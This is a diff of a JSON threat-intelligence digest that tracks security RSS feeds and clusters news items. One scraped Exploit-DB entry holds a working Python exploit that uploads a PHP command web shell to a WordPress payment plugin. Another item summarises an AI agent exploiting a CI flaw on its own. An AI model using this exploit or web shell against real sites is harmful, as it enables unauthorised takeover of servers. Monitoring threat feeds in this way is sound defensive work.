@@ -1,10 +1,10 @@
 {
-  "generated_at": "2026-08-20T15:39:32.917740+00:00",
+  "generated_at": "2026-08-20T16:41:07.731277+00:00",
   "lookback_hours": 168,
   "lookback_human": "7 days",
   "total_feeds": 80,
   "feeds_ok": 74,
-  "total_items_in_window": 321,
+  "total_items_in_window": 323,
   "total_clusters_raw": 146,
   "total_clusters_in_packet": 57,
   "dropped_low_score": 89,
@@ -95,13 +95,6 @@
       "item_count": 10,
       "in_window_count": 0
     },
-    "Trend Micro Research": {
-      "url": "https://newsroom.trendmicro.com/news-releases?pagetemplate=rss&category=787",
-      "cohort": "threat_research_primary",
-      "status": "ok",
-      "item_count": 25,
-      "in_window_count": 0
-    },
     "Google Threat Analysis Group": {
       "url": "https://blog.google/threat-analysis-group/rss/",
       "cohort": "threat_research_primary",
@@ -109,11 +102,11 @@
       "item_count": 0,
       "in_window_count": 0
     },
-    "Sekoia": {
-      "url": "https://blog.sekoia.io/feed/",
+    "Trend Micro Research": {
+      "url": "https://newsroom.trendmicro.com/news-releases?pagetemplate=rss&category=787",
       "cohort": "threat_research_primary",
-      "status": "parse_error",
-      "item_count": 0,
+      "status": "ok",
+      "item_count": 25,
       "in_window_count": 0
     },
     "Microsoft Threat Intelligence": {
@@ -123,19 +116,12 @@
       "item_count": 10,
       "in_window_count": 0
     },
-    "NCSC UK": {
-      "url": "https://www.ncsc.gov.uk/api/1/services/v1/all-rss-feed.xml",
-      "cohort": "government_authoritative",
-      "status": "ok",
-      "item_count": 20,
-      "in_window_count": 1
-    },
-    "Citizen Lab": {
-      "url": "https://citizenlab.ca/feed/",
+    "Sekoia": {
+      "url": "https://blog.sekoia.io/feed/",
       "cohort": "threat_research_primary",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 1
+      "status": "parse_error",
+      "item_count": 0,
+      "in_window_count": 0
     },
     "Check Point Research": {
       "url": "https://research.checkpoint.com/feed/",
@@ -144,6 +130,20 @@
       "item_count": 15,
       "in_window_count": 3
     },
+    "Citizen Lab": {
+      "url": "https://citizenlab.ca/feed/",
+      "cohort": "threat_research_primary",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 1
+    },
+    "Kaspersky Securelist": {
+      "url": "https://securelist.com/feed/",
+      "cohort": "threat_research_primary",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 1
+    },
     "SANS Internet Storm Center": {
       "url": "https://isc.sans.edu/rssfeed_full.xml",
       "cohort": "government_authoritative",
@@ -151,11 +151,11 @@
       "item_count": 10,
       "in_window_count": 10
     },
-    "Kaspersky Securelist": {
-      "url": "https://securelist.com/feed/",
-      "cohort": "threat_research_primary",
+    "NCSC UK": {
+      "url": "https://www.ncsc.gov.uk/api/1/services/v1/all-rss-feed.xml",
+      "cohort": "government_authoritative",
       "status": "ok",
-      "item_count": 10,
+      "item_count": 20,
       "in_window_count": 1
     },
     "ESET WeLiveSecurity": {
@@ -186,9 +186,9 @@
       "item_count": 15,
       "in_window_count": 4
     },
-    "Volexity": {
-      "url": "https://www.volexity.com/feed/",
-      "cohort": "threat_research_primary",
+    "GitHub Security Lab": {
+      "url": "https://github.blog/category/security/feed/",
+      "cohort": "offensive_vulnerability_research",
       "status": "ok",
       "item_count": 10,
       "in_window_count": 0
@@ -200,6 +200,13 @@
       "item_count": 40,
       "in_window_count": 0
     },
+    "Volexity": {
+      "url": "https://www.volexity.com/feed/",
+      "cohort": "threat_research_primary",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 0
+    },
     "Red Canary": {
       "url": "https://redcanary.com/feed/",
       "cohort": "detection_response_operations",
@@ -207,11 +214,11 @@
       "item_count": 10,
       "in_window_count": 0
     },
-    "GitHub Security Lab": {
-      "url": "https://github.blog/category/security/feed/",
+    "watchTowr Labs": {
+      "url": "https://labs.watchtowr.com/rss/",
       "cohort": "offensive_vulnerability_research",
       "status": "ok",
-      "item_count": 10,
+      "item_count": 15,
       "in_window_count": 1
     },
     "Exploit-DB": {
@@ -221,15 +228,29 @@
       "item_count": 50,
       "in_window_count": 16
     },
-    "watchTowr Labs": {
-      "url": "https://labs.watchtowr.com/rss/",
+    "Assetnote": {
+      "url": "https://www.assetnote.io/resources/research/rss.xml",
       "cohort": "offensive_vulnerability_research",
-      "status": "ok",
-      "item_count": 15,
-      "in_window_count": 1
+      "status": "parse_error",
+      "item_count": 0,
+      "in_window_count": 0
     },
     "The DFIR Report": {
       "url": "https://thedfirreport.com/feed/",
+      "cohort": "detection_response_operations",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 0
+    },
+    "Black Hills Information Security": {
+      "url": "https://www.blackhillsinfosec.com/feed/",
+      "cohort": "detection_response_operations",
+      "status": "parse_error",
+      "item_count": 0,
+      "in_window_count": 0
+    },
+    "Proofpoint Threat Insight": {
+      "url": "https://www.proofpoint.com/us/rss.xml",
       "cohort": "detection_response_operations",
       "status": "ok",
       "item_count": 10,
@@ -242,40 +263,12 @@
       "item_count": 10,
       "in_window_count": 1
     },
-    "Black Hills Information Security": {
-      "url": "https://www.blackhillsinfosec.com/feed/",
-      "cohort": "detection_response_operations",
-      "status": "parse_error",
-      "item_count": 0,
-      "in_window_count": 0
-    },
-    "Assetnote": {
-      "url": "https://www.assetnote.io/resources/research/rss.xml",
-      "cohort": "offensive_vulnerability_research",
-      "status": "parse_error",
-      "item_count": 0,
-      "in_window_count": 0
-    },
-    "Proofpoint Threat Insight": {
-      "url": "https://www.proofpoint.com/us/rss.xml",
-      "cohort": "detection_response_operations",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 0
-    },
     "Active Countermeasures": {
       "url": "https://www.activecountermeasures.com/feed/",
       "cohort": "detection_response_operations",
       "status": "ok",
       "item_count": 10,
       "in_window_count": 0
-    },
-    "Sophos X-Ops": {
-      "url": "https://news.sophos.com/en-us/category/threat-research/feed/",
-      "cohort": "detection_response_operations",
-      "status": "ok",
-      "item_count": 15,
-      "in_window_count": 2
     },
     "Elastic Security Labs": {
       "url": "https://www.elastic.co/security-labs/rss/feed.xml",
@@ -284,12 +277,12 @@
       "item_count": 20,
       "in_window_count": 0
     },
-    "SpecterOps": {
-      "url": "https://medium.com/feed/specter-ops-posts",
+    "Sophos X-Ops": {
+      "url": "https://news.sophos.com/en-us/category/threat-research/feed/",
       "cohort": "detection_response_operations",
       "status": "ok",
-      "item_count": 10,
-      "in_window_count": 0
+      "item_count": 15,
+      "in_window_count": 2
     },
     "Datadog Security Labs": {
       "url": "https://securitylabs.datadoghq.com/rss/feed.xml",
@@ -303,6 +296,20 @@
       "cohort": "cloud_identity_infrastructure",
       "status": "ok",
       "item_count": 10,
+      "in_window_count": 6
+    },
+    "SpecterOps": {
+      "url": "https://medium.com/feed/specter-ops-posts",
+      "cohort": "detection_response_operations",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 0
+    },
+    "Rapid7": {
+      "url": "https://www.rapid7.com/blog/rss/",
+      "cohort": "offensive_vulnerability_research",
+      "status": "ok",
+      "item_count": 20,
       "in_window_count": 6
     },
     "AWS Security Blog": {
@@ -319,26 +326,19 @@
       "item_count": 100,
       "in_window_count": 2
     },
-    "Permiso Security": {
-      "url": "https://permiso.io/blog/rss.xml",
-      "cohort": "cloud_identity_infrastructure",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 0
-    },
-    "Rapid7": {
-      "url": "https://www.rapid7.com/blog/rss/",
-      "cohort": "offensive_vulnerability_research",
-      "status": "ok",
-      "item_count": 20,
-      "in_window_count": 7
-    },
     "Google Cloud Threat Intelligence": {
       "url": "https://feeds.feedburner.com/threatintelligence/pvexyqv7v0v",
       "cohort": "threat_research_primary",
       "status": "ok",
       "item_count": 20,
       "in_window_count": 2
+    },
+    "Permiso Security": {
+      "url": "https://permiso.io/blog/rss.xml",
+      "cohort": "cloud_identity_infrastructure",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 0
     },
     "Trail of Bits": {
       "url": "https://blog.trailofbits.com/feed/",
@@ -354,18 +354,18 @@
       "item_count": 100,
       "in_window_count": 0
     },
-    "Cloudflare Security": {
-      "url": "https://blog.cloudflare.com/tag/security/rss/",
-      "cohort": "cloud_identity_infrastructure",
-      "status": "ok",
-      "item_count": 20,
-      "in_window_count": 0
-    },
     "Protect AI": {
       "url": "https://protectai.com/blog/rss.xml",
       "cohort": "ai_security_agentic_risk",
       "status": "parse_error",
       "item_count": 0,
+      "in_window_count": 0
+    },
+    "Cloudflare Security": {
+      "url": "https://blog.cloudflare.com/tag/security/rss/",
+      "cohort": "cloud_identity_infrastructure",
+      "status": "ok",
+      "item_count": 20,
       "in_window_count": 0
     },
     "Cloudflare Radar": {
@@ -375,19 +375,19 @@
       "item_count": 20,
       "in_window_count": 1
     },
-    "Google DeepMind Blog": {
-      "url": "https://deepmind.google/blog/rss.xml",
-      "cohort": "ai_security_agentic_risk",
-      "status": "ok",
-      "item_count": 100,
-      "in_window_count": 1
-    },
     "Wiz Research": {
       "url": "https://www.wiz.io/feed/rss.xml",
       "cohort": "cloud_identity_infrastructure",
       "status": "ok",
       "item_count": 100,
       "in_window_count": 7
+    },
+    "Google DeepMind Blog": {
+      "url": "https://deepmind.google/blog/rss.xml",
+      "cohort": "ai_security_agentic_risk",
+      "status": "ok",
+      "item_count": 100,
+      "in_window_count": 1
     },
     "Coveware": {
       "url": "https://www.coveware.com/blog?format=rss",
@@ -424,13 +424,6 @@
       "item_count": 15,
       "in_window_count": 15
     },
-    "Google Cloud Security": {
-      "url": "https://cloudblog.withgoogle.com/rss/",
-      "cohort": "cloud_identity_infrastructure",
-      "status": "ok",
-      "item_count": 20,
-      "in_window_count": 10
-    },
     "Interconnects": {
       "url": "https://www.interconnects.ai/feed",
       "cohort": "ai_security_agentic_risk",
@@ -459,13 +452,6 @@
       "item_count": 30,
       "in_window_count": 15
     },
-    "AI Snake Oil": {
-      "url": "https://www.aisnakeoil.com/feed",
-      "cohort": "ai_security_agentic_risk",
-      "status": "ok",
-      "item_count": 20,
-      "in_window_count": 0
-    },
     "CyberScoop": {
       "url": "https://cyberscoop.com/feed/",
       "cohort": "cyber_news_breach_reporting",
@@ -480,6 +466,13 @@
       "item_count": 50,
       "in_window_count": 22
     },
+    "Google Cloud Security": {
+      "url": "https://cloudblog.withgoogle.com/rss/",
+      "cohort": "cloud_identity_infrastructure",
+      "status": "ok",
+      "item_count": 20,
+      "in_window_count": 14
+    },
     "Help Net Security": {
       "url": "https://www.helpnetsecurity.com/feed/",
       "cohort": "cyber_news_breach_reporting",
@@ -487,11 +480,18 @@
       "item_count": 10,
       "in_window_count": 10
     },
-    "Troy Hunt": {
-      "url": "https://www.troyhunt.com/rss/",
-      "cohort": "practitioner_analysis",
+    "AI Snake Oil": {
+      "url": "https://www.aisnakeoil.com/feed",
+      "cohort": "ai_security_agentic_risk",
       "status": "ok",
-      "item_count": 15,
+      "item_count": 20,
+      "in_window_count": 0
+    },
+    "Team Cymru": {
+      "url": "https://www.team-cymru.com/post/rss.xml",
+      "cohort": "ransomware_ecrime_financial_crime",
+      "status": "ok",
+      "item_count": 100,
       "in_window_count": 1
     },
     "Schneier on Security": {
@@ -501,64 +501,15 @@
       "item_count": 10,
       "in_window_count": 7
     },
-    "Team Cymru": {
-      "url": "https://www.team-cymru.com/post/rss.xml",
-      "cohort": "ransomware_ecrime_financial_crime",
+    "Troy Hunt": {
+      "url": "https://www.troyhunt.com/rss/",
+      "cohort": "practitioner_analysis",
       "status": "ok",
-      "item_count": 100,
+      "item_count": 15,
       "in_window_count": 1
     },
     "Reddit r/cybersecurity": {
       "url": "https://www.reddit.com/r/cybersecurity/.rss",
-      "cohort": "reddit_practitioner_osint",
-      "status": "ok",
-      "item_count": 0,
-      "in_window_count": 0
-    },
-    "Reddit r/blueteamsec": {
-      "url": "https://www.reddit.com/r/blueteamsec/.rss",
-      "cohort": "reddit_practitioner_osint",
-      "status": "ok",
-      "item_count": 0,
-      "in_window_count": 0
-    },
-    "Reddit r/sysadmin": {
-      "url": "https://www.reddit.com/r/sysadmin/.rss",
-      "cohort": "reddit_practitioner_osint",
-      "status": "ok",
-      "item_count": 0,
-      "in_window_count": 0
-    },
-    "Graham Cluley": {
-      "url": "https://grahamcluley.com/feed/",
-      "cohort": "practitioner_analysis",
-      "status": "ok",
-      "item_count": 20,
-      "in_window_count": 3
-    },
-    "Krebs on Security": {
-      "url": "https://krebsonsecurity.com/feed/",
-      "cohort": "practitioner_analysis",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 1
-    },
-    "The Hacker News": {
-      "url": "https://feeds.feedburner.com/TheHackersNews",
-      "cohort": "cyber_news_breach_reporting",
-      "status": "ok",
-      "item_count": 50,
-      "in_window_count": 50
-    },
-    "Reddit r/msp": {
-      "url": "https://www.reddit.com/r/msp/.rss",
-      "cohort": "reddit_practitioner_osint",
-      "status": "ok",
-      "item_count": 0,
-      "in_window_count": 0
-    },
-    "Reddit r/netsecstudents": {
-      "url": "https://www.reddit.com/r/netsecstudents/.rss",
       "cohort": "reddit_practitioner_osint",
       "status": "ok",
       "item_count": 0,
@@ -571,12 +522,47 @@
       "item_count": 100,
       "in_window_count": 1
     },
-    "Infosecurity Magazine": {
-      "url": "https://www.infosecurity-magazine.com/rss/news/",
-      "cohort": "cyber_news_breach_reporting",
+    "Reddit r/blueteamsec": {
+      "url": "https://www.reddit.com/r/blueteamsec/.rss",
+      "cohort": "reddit_practitioner_osint",
       "status": "ok",
-      "item_count": 100,
-      "in_window_count": 28
+      "item_count": 0,
+      "in_window_count": 0
+    },
+    "Krebs on Security": {
+      "url": "https://krebsonsecurity.com/feed/",
+      "cohort": "practitioner_analysis",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 1
+    },
+    "Graham Cluley": {
+      "url": "https://grahamcluley.com/feed/",
+      "cohort": "practitioner_analysis",
+      "status": "ok",
+      "item_count": 20,
+      "in_window_count": 3
+    },
+    "Reddit r/sysadmin": {
+      "url": "https://www.reddit.com/r/sysadmin/.rss",
+      "cohort": "reddit_practitioner_osint",
+      "status": "ok",
+      "item_count": 0,
+      "in_window_count": 0
+    },
+    "Reddit r/netsecstudents": {
+      "url": "https://www.reddit.com/r/netsecstudents/.rss",
+      "cohort": "reddit_practitioner_osint",
+      "status": "ok",
+      "item_count": 0,
+      "in_window_count": 0
+    },
+    "Reddit r/msp": {
+      "url": "https://www.reddit.com/r/msp/.rss",
+      "cohort": "reddit_practitioner_osint",
+      "status": "ok",
+      "item_count": 0,
+      "in_window_count": 0
     },
     "Reddit r/AskNetsec": {
       "url": "https://www.reddit.com/r/AskNetsec/.rss",
@@ -584,6 +570,20 @@
       "status": "ok",
       "item_count": 0,
       "in_window_count": 0
+    },
+    "Infosecurity Magazine": {
+      "url": "https://www.infosecurity-magazine.com/rss/news/",
+      "cohort": "cyber_news_breach_reporting",
+      "status": "ok",
+      "item_count": 100,
+      "in_window_count": 28
+    },
+    "The Hacker News": {
+      "url": "https://feeds.feedburner.com/TheHackersNews",
+      "cohort": "cyber_news_breach_reporting",
+      "status": "ok",
+      "item_count": 50,
+      "in_window_count": 50
     },
     "Reddit r/netsec": {
       "url": "https://www.reddit.com/r/netsec/.rss",
@@ -2277,198 +2277,6 @@
       ]
     },
     {
-      "cluster_id": "44ffee7a7d",
-      "priority_score": 16,
-      "member_count": 5,
-      "corroborating_source_count": 4,
-      "strong_signals": [
-        "GitHub"
-      ],
-      "taxonomy": {
-        "threat_categories": [],
-        "actor_attribution": [],
-        "affected_industries": [
-          "education"
-        ],
-        "affected_products": [
-          "Atlassian Jira",
-          "Azure",
-          "GitHub",
-          "Snowflake"
-        ],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [],
-        "content_type": [
-          "news_report",
-          "vulnerability_disclosure"
-        ],
-        "confidence_tier": [
-          "tier_1_offensive_research",
-          "tier_2_operator",
-          "tier_4_news",
-          "tier_5_chatter"
-        ]
-      },
-      "primary": {
-        "source": "GitHub Security Lab",
-        "cohort": "offensive_vulnerability_research",
-        "title": "What 50 open source projects taught us about security in the AI era",
-        "link": "https://github.blog/open-source/maintainers/what-50-open-source-projects-taught-us-about-security-in-the-ai-era/",
-        "published": "2026-08-13T16:00:00+00:00",
-        "summary": "See how the open source projects in Session 4 of the GitHub Secure Open Source Fund combined AI-assisted workflows, maintainer expertise, GitHub security tools, expert guidance, and funding to improve project security. The post What 50 open source projects taught us about security in the AI era appeared first on The GitHub Blog .",
-        "full_body": "Gregg Cochran · @dubsopenhub August 13, 2026 | 11 minutes Share: AI is changing the pace of open source development and the security challenges that come with it. Maintainers are reviewing unfamiliar contributions, managing new attack surfaces, and responding to vulnerabilities with limited time and resources. Session 4 of the GitHub Secure Open Source Fund tested a practical response. The Secure Fund invested more than $500,000 across 50 projects , pairing maintainers with GitHub Security Lab experts, GitHub security tools, AI-assisted workflows, and a peer community. One lesson emerged consistently: AI can help maintainers investigate, prioritize, and respond faster. Maintainers still provide the context, judgement, and accountability required to decide what ships. OpenClaw was invited to participate in Session 4 because it is GitHub’s fastest-growing open source project, and its maintainers wanted to strengthen its security posture. By the end of Session 4, OpenClaw developed an incident response plan, expanded its use of GitHub security tooling, audited its GitHub Actions workflows, and strengthened its processes for identifying and responding to security issues. The maintainers shared: OpenClaw’s experience reflects the broader story of Session 4. While the specific risks varied across the cohort, maintainers shared a consistent need: the knowledge, tools, and expert support to secure software as AI changed how they built it. Across the program, maintainers turned that support into concrete security improvements. Projects strengthened established practices, prepared for emerging AI-related risks, and explored how tools like GitHub Copilot could support vulnerability triage, threat modeling, code review, and remediation. The benefits extend beyond individual projects. When maintainers strengthen the security of widely used open source software, they help build a more resilient ecosystem for everyone who depends on it. How the GitHub Secure Open Source Fund works The GitHub Secure Open Source Fund links funding directly to measurable security outcomes. The program combines hands-on security education, direct engagement with GitHub Security Lab experts, and a trusted community where maintainers can work through security challenges with their peers. Each session is a three-week sprint and engagement for a total of 12 months. Funding and participation are tied directly to outcome‑driven goals and verified security improvements. The sprint is designed and curated by the GitHub Security Lab , and delivered by security experts from GitHub and our partners. The training is structured into different focus areas per week. These include: Foundations of open source security Threat modeling and secure coding AI security and vulnerability management Throughout this program, each project receives $10,000 USD via GitHub Sponsors (which breaks down to $6,000 USD during the sprint and $2,000 USD at six- and 12-month security check-ins). Projects are invited to a new security-focused community and office hours with the GitHub Security Lab , which they can take advantage of during the full 12 months. They also receive security resources to immediately implement in their project and Azure credits for cloud infrastructure. Learn more about the Secure Open Source Fund. Apply for Session 5 of the GitHub Secure Open Source Fund before August 24. Become a Funding or Ecosystem Partner of the GitHub Secure Open Source Fund. Where security work happened in Session 4 Session 4 focused on improving security across the systems developers rely on every day. The projects below are grouped by the role they play in the software ecosystem. AI, machine learning, and intelligent systems 🤖 Caracal • Deep Agents • DocsGPT • LadybugDB • LangChain • n8n-MCP • Nasiko • ONNX • OpenClaw • PageIndex • Scenic • Serena These projects sit at the intersection of AI, automation, data infrastructure, and machine learning. They increasingly serve as foundational components fo",
-        "fetch_status": "ok",
-        "taxonomy": {
-          "threat_categories": [],
-          "actor_attribution": [],
-          "affected_industries": [
-            "education"
-          ],
-          "affected_products": [
-            "GitHub",
-            "Azure"
-          ],
-          "tools_used": [],
-          "cve_ids": [],
-          "attack_techniques": [],
-          "urgency_signals": [],
-          "content_type": "news_report",
-          "confidence_tier": "tier_1_offensive_research",
-          "role_map": {
-            "GitHub": "target",
-            "Azure": "target"
-          },
-          "weak_tags": {
-            "products": []
-          }
-        }
-      },
-      "corroborating_sources": [
-        {
-          "source": "GitHub Security Lab",
-          "cohort": "offensive_vulnerability_research",
-          "title": "What 50 open source projects taught us about security in the AI era",
-          "link": "https://github.blog/open-source/maintainers/what-50-open-source-projects-taught-us-about-security-in-the-ai-era/",
-          "published": "2026-08-13T16:00:00+00:00",
-          "summary": "See how the open source projects in Session 4 of the GitHub Secure Open Source Fund combined AI-assisted workflows, maintainer expertise, GitHub security tools, expert guidance, and funding to improve project security. The post What 50 open source projects taught us about security in the AI era appeared first on The GitHub Blog .",
-          "taxonomy": {
-            "threat_categories": [],
-            "actor_attribution": [],
-            "affected_industries": [
-              "education"
-            ],
-            "affected_products": [
-              "GitHub",
-              "Azure"
-            ],
-            "tools_used": [],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "urgency_signals": [],
-            "content_type": "news_report",
-            "confidence_tier": "tier_1_offensive_research",
-            "role_map": {
-              "GitHub": "target",
-              "Azure": "target"
-            },
-            "weak_tags": {
-              "products": []
-            }
-          }
-        },
-        {
-          "source": "The Hacker News",
-          "cohort": "cyber_news_breach_reporting",
-          "title": "Isolated-vm Flaw Lets Sandboxed JavaScript Escape to Host for Potential RCE",
-          "link": "https://thehackernews.com/2026/08/isolated-vm-flaw-lets-sandboxed.html",
-          "published": "2026-08-20T13:48:24+00:00",
-          "summary": "Cybersecurity researchers have disclosed a critical security flaw in isolated-vm, a popular open-source sandbox with more than 2,900 stars and 190 forks on GitHub, that could allow attackers to escape the confines of the isolated environment. The vulnerability (\"GHSA-864f-rcv7-6rh4\"), which has yet to be assigned a CVE identifier, impacts all versions of the library before and including 7.0.0.",
-          "taxonomy": {
-            "threat_categories": [],
-            "actor_attribution": [],
-            "affected_industries": [],
-            "affected_products": [
-              "GitHub"
-            ],
-            "tools_used": [],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "urgency_signals": [],
-            "content_type": "news_report",
-            "confidence_tier": "tier_4_news",
-            "role_map": {
-              "GitHub": "target"
-            },
-            "weak_tags": {
-              "products": []
-            }
-          }
-        },
-        {
-          "source": "Wiz Research",
-          "cohort": "cloud_identity_infrastructure",
-          "title": "Wiz Red Agent Finds Its Way Into Snowflake’s Internal Jira Through a Flaw in a GitHub Copilot–Assisted PR",
-          "link": "https://www.wiz.io/blog/red-agent-snowflake-copilot-cicd-bug",
-          "published": "2026-08-17T14:00:00+00:00",
-          "summary": "Wiz Red Agent independently discovered and exploited a GitHub Actions injection missed by GitHub’s Advanced Security, validated access to sensitive data in Snowflake’s internal Jira, and assessed the blast radius—all without human intervention, five days after the flaw became live.",
-          "taxonomy": {
-            "threat_categories": [],
-            "actor_attribution": [],
-            "affected_industries": [],
-            "affected_products": [
-              "GitHub",
-              "Snowflake",
-              "Atlassian Jira"
-            ],
-            "tools_used": [],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "urgency_signals": [],
-            "content_type": "news_report",
-            "confidence_tier": "tier_2_operator",
-            "role_map": {
-              "GitHub": "target",
-              "Snowflake": "target",
-              "Atlassian Jira": "target"
-            },
-            "weak_tags": {
-              "products": []
-            }
-          }
-        },
-        {
-          "source": "Reddit r/netsec",
-          "cohort": "reddit_practitioner_osint",
-          "title": "How a popular Android library silently exposed thousands of apps to Arbitrary File Overwrite (AFO). https://itis911.github.io/writeups/cropper-vulnerability.html",
-          "link": "https://www.reddit.com/r/netsec/comments/1vru26k/how_a_popular_android_library_silently_exposed/",
-          "published": "2026-08-18T16:24:33+00:00",
-          "summary": "submitted by /u/Fit_Veterinarian4403 [link] [comments]",
-          "taxonomy": {
-            "threat_categories": [],
-            "actor_attribution": [],
-            "affected_industries": [],
-            "affected_products": [
-              "GitHub"
-            ],
-            "tools_used": [],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "urgency_signals": [],
-            "content_type": "vulnerability_disclosure",
-            "confidence_tier": "tier_5_chatter",
-            "role_map": {
-              "GitHub": "target"
-            },
-            "weak_tags": {
-              "products": []
-            }
-          }
-        }
-      ]
-    },
-    {
       "cluster_id": "fc66ccb428",
       "priority_score": 16,
       "member_count": 2,
@@ -2595,9 +2403,13 @@
         "threat_categories": [],
         "actor_attribution": [],
         "affected_industries": [],
-        "affected_products": [],
+        "affected_products": [
+          "WordPress"
+        ],
         "tools_used": [],
-        "cve_ids": [],
+        "cve_ids": [
+          "CVE-2026-3891"
+        ],
         "attack_techniques": [],
         "urgency_signals": [
           "preauth_unauth"
@@ -2616,22 +2428,28 @@
         "link": "https://www.exploit-db.com/exploits/52642",
         "published": "2026-08-17T00:00:00+00:00",
         "summary": "WooCommerce 1.5.0 - Unauthenticated Arbitrary File Upload",
-        "full_body": "",
-        "fetch_status": "fetch_failed:HTTPError",
+        "full_body": "Exploit Database Exploits GHDB Papers Shellcodes Search EDB SearchSploit Manual Submissions Online Training WooCommerce 1.5.0 - Unauthenticated Arbitrary File Upload EDB-ID: 52642 CVE: 2026-3891 EDB Verified: Author: Mohammad Hossein Sadeghian Type: webapps Exploit: / Platform: Multiple Date: 2026-08-17 Vulnerable App: # Exploit Title: WooCommerce 1.5.0 - Unauthenticated Arbitrary File Upload # Google Dork: N/A # Date: 2026-07-15 # Exploit Author: Mohammad Hossein Sadeghian # Vendor Homepage: https://wordpress.org/plugins/payment-gateway-pix-for-woocommerce/ # Software Link: https://wordpress.org/plugins/payment-gateway-pix-for-woocommerce/ # Version: <= 1.5.0 # Tested on: Ubuntu 22.04 LTS, Apache 2.4, PHP 8.2, WordPress 6.7 # CVE: CVE-2026-3891 import requests import sys def print_banner(): banner = r\"\"\" ____ __ _ __ __ / __ \\________ ____ _____/ / / | / /__ / /_ / / / / ___/ _ \\/ __ \\/ __ / / |/ / _ \\/ __/ / /_/ / / / __/ /_/ / /_/ / / /| / __/ /_ /_____/_/ \\___/\\__,_/\\__,_/ /_/ |_/\\___/\\__/ Author: m4sh_wacker \"\"\" print(banner) def main(): print_banner() target = input(\"[?] Enter target URL: \").strip().rstrip(\"/\") if not target.startswith((\"http://\", \"https://\")): target = \"http://\" + target ajax_url = f\"{target}/wp-admin/admin-ajax.php\" filename = \"woocommerce.php\" content = '<?php if(isset($_REQUEST[\"cmd\"])){system($_REQUEST[\"cmd\"]);} ?>' session = requests.Session() print(\"\\n[*] Requesting nonce...\") try: response = session.post( ajax_url, data={ \"action\": \"lkn_pix_for_woocommerce_generate_nonce\", \"action_name\": \"lkn_pix_for_woocommerce_c6_settings_nonce\" }, timeout=10 ) result = response.json() nonce = result[\"data\"][\"nonce\"] print(f\"[+] Nonce obtained: {nonce}\") except Exception as e: print(f\"[-] Failed to obtain nonce: {e}\") sys.exit(1) print(f\"[*] Uploading {filename}...\") try: response = session.post( ajax_url, data={ \"action\": \"lkn_pix_for_woocommerce_c6_save_settings\", \"_ajax_nonce\": nonce }, files={ \"certificate_crt_path\": ( filename, content, \"text/plain\" ) }, timeout=10 ) result = response.json() if not result.get(\"success\"): print(\"[-] Upload failed.\") print(response.text) sys.exit(1) except Exception as e: print(f\"[-] Upload error: {e}\") sys.exit(1) uploaded_url = ( f\"{target}/wp-content/plugins/\" f\"payment-gateway-pix-for-woocommerce/\" f\"Includes/files/certs_c6/{filename}\" ) print(\"\\n[+] File uploaded successfully!\") print(f\"[+] URL: {uploaded_url}\") if __name__ == \"__main__\": main() Tags: Advisory/Source: Link Databases Links Sites Solutions Exploits Search Exploit-DB OffSec Courses and Certifications Google Hacking Submit Entry Kali Linux Learn Subscriptions Papers SearchSploit Manual VulnHub OffSec Cyber Range Shellcodes Exploit Statistics Proving Grounds Penetration Testing Services Databases Exploits Google Hacking Papers Shellcodes Links Search Exploit-DB Submit Entry SearchSploit Manual Exploit Statistics Sites OffSec Kali Linux VulnHub Solutions Courses and Certifications Learn Subscriptions OffSec Cyber Range Proving Grounds Penetration Testing Services",
+        "fetch_status": "ok",
         "taxonomy": {
           "threat_categories": [],
           "actor_attribution": [],
           "affected_industries": [],
-          "affected_products": [],
+          "affected_products": [
+            "WordPress"
+          ],
           "tools_used": [],
-          "cve_ids": [],
+          "cve_ids": [
+            "CVE-2026-3891"
+          ],
           "attack_techniques": [],
           "urgency_signals": [
             "preauth_unauth"
           ],
           "content_type": "news_report",
           "confidence_tier": "tier_1_offensive_research",
-          "role_map": {},
+          "role_map": {
+            "WordPress": "target"
+          },
           "weak_tags": {
             "products": []
           }
@@ -2649,16 +2467,199 @@
             "threat_categories": [],
             "actor_attribution": [],
             "affected_industries": [],
-            "affected_products": [],
+            "affected_products": [
+              "WordPress"
+            ],
             "tools_used": [],
-            "cve_ids": [],
+            "cve_ids": [
+              "CVE-2026-3891"
+            ],
             "attack_techniques": [],
             "urgency_signals": [
               "preauth_unauth"
             ],
             "content_type": "news_report",
             "confidence_tier": "tier_1_offensive_research",
-            "role_map": {},
+            "role_map": {
+              "WordPress": "target"
+            },
+            "weak_tags": {
+              "products": []
+            }
+          }
+        }
+      ]
+    },
+    {
+      "cluster_id": "9f44f5f9a4",
+      "priority_score": 13,
+      "member_count": 4,
+      "corroborating_source_count": 3,
+      "strong_signals": [
+        "GitHub"
+      ],
+      "taxonomy": {
+        "threat_categories": [
+          "credential_theft",
+          "ddos"
+        ],
+        "actor_attribution": [],
+        "affected_industries": [
+          "telecommunications"
+        ],
+        "affected_products": [
+          "Anthropic/Claude",
+          "Atlassian Jira",
+          "Azure",
+          "GitHub",
+          "Snowflake"
+        ],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": [
+          "news_report",
+          "vulnerability_disclosure"
+        ],
+        "confidence_tier": [
+          "tier_2_operator",
+          "tier_4_news",
+          "tier_5_chatter"
+        ]
+      },
+      "primary": {
+        "source": "The Hacker News",
+        "cohort": "cyber_news_breach_reporting",
+        "title": "Isolated-vm Flaw Lets Sandboxed JavaScript Escape to Host for Potential RCE",
+        "link": "https://thehackernews.com/2026/08/isolated-vm-flaw-lets-sandboxed.html",
+        "published": "2026-08-20T13:48:24+00:00",
